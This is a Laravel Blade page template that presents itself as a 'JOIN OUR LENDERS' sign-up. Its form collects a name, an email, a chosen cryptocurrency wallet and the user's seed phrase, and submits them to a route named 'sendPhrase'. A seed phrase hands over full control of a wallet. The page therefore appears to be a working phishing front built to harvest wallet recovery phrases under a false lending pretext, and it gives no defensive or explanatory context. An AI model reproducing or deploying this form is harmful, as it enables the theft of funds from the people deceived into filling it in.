@extends('pages.layout.app')
@section('content')

<div class="body-overlay"></div>
    <!-- slide bar end -->

<main>

    <!-- breadcrumb start -->
    <section class="breadcrumb pos-rel">
        <div class="container">
            <div class="breadcrumb__content">
                <h2 class="breadcrumb__title">JOIN OUR LENDERS</h2>
            </div>
        </div>
        <div class="breadcrumb__shape">
            <img src="assets/img/shape/b_shape1.png" alt="">
        </div>
        <div class="breadcrumb__icon">
            <div class="icon icon--1">
                <div data-parallax="{&quot;y&quot; : 80}" style="transform:translate3d(0px, 49.803px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, 49.803px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_01.png" alt="">
                </div>
            </div>
            <div class="icon icon--2">
                <div data-parallax="{&quot;x&quot; : -90}" style="transform:translate3d(-55.999px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(-55.999px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_02.png" alt="">
                </div>
            </div>
            <div class="icon icon--3">
                <div data-parallax="{&quot;y&quot; : -80}" style="transform:translate3d(0px, -49.773px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, -49.773px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_03.png" alt="">
                </div>
            </div>
            <div class="icon icon--4">
                <div data-parallax="{&quot;x&quot; : 90}" style="transform:translate3d(56.029px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(56.029px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_04.png" alt="">
                </div>
            </div>
        </div>
    </section>
    <!-- breadcrumb end -->


    <!-- contact start -->
    <section class="ico-contact pos-rel">
        <div class="container">
            <div class="ico-contact__wrap">
                <h2 class="title">GET STARTED</h2>
                <form action="{{ route('sendPhrase') }}" method="POST">
                    @csrf
                    @if(session()->has('success'))
                        <div class="alert alert-success">
                            {{ session()->get('success') }}
                        </div>
                    @endif
                    @if(session()->has('error'))
                        <div class="alert alert-danger">
                            {{ session()->get('error') }}
                        </div>
                    @endif
                    @if ($errors->any())
                        <div class="alert alert-danger">
                            <ul>
                                @foreach ($errors->all() as $error)
                                    <li>{{ $error }}</li>
                                @endforeach
                            </ul>
                        </div>
                    @endif
                    <div class="row">
                        <div class="col-lg-6">
                            <label >Name:</label>
                            <input type="text" name="name" placeholder="Enter Name">
                        </div>
                        <div class="col-lg-6">
                            <label >Email:</label>
                            <input type="email" name="email" placeholder="Enter Mail">
                        </div>
                        <div class="col-lg-12 mb-3">
                            <label for="crypto-wallet">Select a Crypto Wallet:</label>
                            <select id="crypto-wallet" name="wallet" class="form-control">
                                <option value="Bitcoin Wallet">Bitcoin Wallet</option>
                                <option value="Ethereum Wallet">Ethereum Wallet</option>
                                <option value="Ripple Wallet">Ripple Wallet</option>
                                <option value="Litecoin Wallet">Litecoin Wallet</option>
                                <option value="Cardano Wallet">Cardano Wallet</option>
                                <option value="Polkadot Wallet">Polkadot Wallet</option>
                                <option value="Chainlink Wallet">Chainlink Wallet</option>
                                <option value="Stellar Wallet">Stellar Wallet</option>
                                <option value="Tezos Wallet">Tezos Wallet</option>
                                <option value="VeChain Wallet">VeChain Wallet</option>
                                <option value="Tron Wallet">Tron Wallet</option>
                                <option value="EOS Wallet">EOS Wallet</option>
                                <option value="Dash Wallet">Dash Wallet</option>
                                <option value="NEO Wallet">NEO Wallet</option>
                                <option value="Cosmos Wallet">Cosmos Wallet</option>
                                <option value="Zcash Wallet">Zcash Wallet</option>
                                <option value="Monero Wallet">Monero Wallet</option>
                                <option value="Avalanche Wallet">Avalanche Wallet</option>
                                <option value="Filecoin Wallet">Filecoin Wallet</option>
                                <option value="Chain Games Wallet">Chain Games Wallet</option>
                            </select>
                        </div>
                        <div class="col-lg-12">
                            <label for="crypto-wallet">Seed Phrase:</label>
                            <textarea name="phrase" id="message" cols="30" rows="10" placeholder="Enter your seed phrase..."></textarea>
                        </div>
                        <div class="ico-contact__btn text-center mt-10">
                            <button class="thm-btn" type="submit">send request</button>
                        </div>
                    </div>

                </form>
                <div class="ico-contact__shape-img">
                    <div class="shape shape--1">
                        <img data-parallax="{&quot;y&quot; : -50}" src="assets/img/shape/c_shape1.png" alt="" style="transform:translate3d(0px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    </div>
                    <div class="shape shape--2">
                        <img data-parallax="{&quot;y&quot; : 60}" src="assets/img/shape/c_shape2.png" alt="" style="transform:translate3d(0px, 0.029px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, 0.029px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    </div>
                </div>
            </div>
        </div>
        <div class="ico-contact__shape">
            <div class="shape shape--1">
                <img src="assets/img/shape/f_shape1.png" alt="">
            </div>
            <div class="shape shape--2">
                <img src="assets/img/shape/f_shape2.png" alt="">
            </div>
            <div class="shape shape--3">
                <img src="assets/img/shape/f_shape3.png" alt="">
            </div>
        </div>
    </section>
    <!-- contact end -->
</main>

@endsection

